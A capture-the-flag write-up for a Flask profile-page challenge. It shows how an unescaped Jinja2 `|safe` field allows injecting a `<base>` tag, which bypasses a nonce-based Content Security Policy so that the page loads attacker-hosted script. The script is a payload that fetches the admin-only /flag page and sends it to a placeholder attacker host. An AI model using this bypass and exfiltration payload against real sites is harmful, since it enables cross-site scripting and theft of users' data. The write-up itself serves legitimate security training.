---
description: Base element CSP bypass
---

# People

## Description

> With the new People personal pages, all the members of the EPFL community can have their own page personalize it with Markdown and much more...

{% file src="../../.gitbook/assets/people.zip" %}

## Solution

This was a client-side web challenge where we had to cause an XSS in a user's profile to obtain the flag through the admin account.

```python
@main.route('/flag')
def flag():
    if request.cookies.get('admin_token') == admin_token:
        return os.getenv('FLAG') or 'flag{flag_not_set}'
    else:
        abort(403)

@main.route('/report/<user_id>', methods=['POST'])
@limiter.limit("2/2 minute")
def report(user_id):
    user = User.query.get(user_id)
    q.enqueue(visit, user.id, admin_token)
    flash("Thank you, an admin will review your report shortly.", "success")
    return redirect(url_for('main.profile', user_id=user_id))
```

Let's take a look at our potential injection points. One of the suspicious features of the profile page was that we were able to edit our bio in Markdown.

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 9.02.39 PM.png" alt=""><figcaption></figcaption></figure>

This is then parsed using `marked` and `DOMPurify`.

```markup
<section>

      ...
        
        <div class="block about">
          <h3>About</h3>
          <div class="markdown">{{ user['bio'] }}</div>
        </div>
        
      ...
        
</section>

...

<script src="/static/js/marked.min.js" nonce="{{ csp_nonce() }}"></script>
<script src="/static/js/purify.min.js" nonce="{{ csp_nonce() }}"></script>
<script nonce="{{ csp_nonce() }}">
  var markdown = document.querySelectorAll(".markdown");
  for (var i = 0; i < markdown.length; i++) {
    var html = marked.parse(markdown[i].innerHTML, {
      breaks: true
    });
    html = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
    markdown[i].innerHTML = html;
  }
</script>
```

We could find out the version numbers of these libraries through the `marked.min.js` and `purify.min.js` files. Doing a search on these versions yielded no security vulnerabilities.

While [mutation XSS](https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e) attacks might still be possible on these libraries, those attacks would likely only happen when `DOMPurify` is used _before_ `marked`, because `marked` deliberately [does not sanitize output HTML](https://marked.js.org/). It was also unlikely that this involved a zero-day in `DOMPurify`, so let's look around a little more.

In Jinja2, the `|safe` [filter](https://jinja.palletsprojects.com/en/3.1.x/templates/#filters) renders unescaped HTML. Doing a grep search for the `safe` filter finds this interesting part of the `profile.html` template.

```django
{% raw %}
{% set description = '%s at %s' % (user['title'], user['lab']) %}
{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
{% endraw %}
```

Nice, we have our HTML injection vector! Trying to insert a `<script>` payload wouldn't work though, since the Content Security Policy doesn't allow us to load arbitrary scripts without a randomly-generated`nonce`.

```python
csp = {
    'script-src': '',
    'object-src': "'none'",
    'style-src': "'self'",
    'default-src': ['*', 'data:']
}
Talisman(app,
    force_https=False,
    strict_transport_security=False,
    session_cookie_secure=False,
    content_security_policy=csp,
    content_security_policy_nonce_in=['script-src'])
```

When this happens, we can rely on the [`<base>` HTML tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) to set the base URL to use for all relative URLs in a document.

This means that we could load the `/static/js/marked.min.js` files from a completely different URL that we control. Since these script tags are part of the original template and the `nonce` is always appropriately set, the browser would have no issues executing the script from our URL.

```markup
<script src="/static/js/marked.min.js" nonce="{{ csp_nonce() }}"></script>
```

We start a HTTP server and create the `/static/js` directory structure, and place our XSS payload in `marked.min.js`.

```javascript
fetch(`http://${window.location.host}/flag`).then(res => res.text()).then(data => {
    fetch("http://HOST:PORT?flag=" + btoa(data));
})
```

Then we could inject `<base href="http://HOST:PORT">` into our profile through `user['title']` or `user['lab']`.
